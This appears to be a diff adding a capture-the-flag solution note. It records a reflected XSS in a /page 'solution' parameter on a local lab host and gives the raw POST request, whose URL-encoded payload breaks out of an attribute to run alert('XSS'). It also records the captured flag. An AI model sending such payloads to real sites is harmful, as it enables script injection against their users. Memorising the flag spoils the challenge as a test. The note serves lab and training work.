@@ -1,0 +1,8 @@
+# Reflected XSS in /page solution parameter. Input placed in value attribute context. Payload breaks out and executes alert('XSS'). Server validates XSS and returns CTF flag: flag{c86ef69f-51d5-4624-835e-2fa149f72065}
+
+POST /page HTTP/1.1
+Host: 172.17.0.1:43899
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 62
+
+solution=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
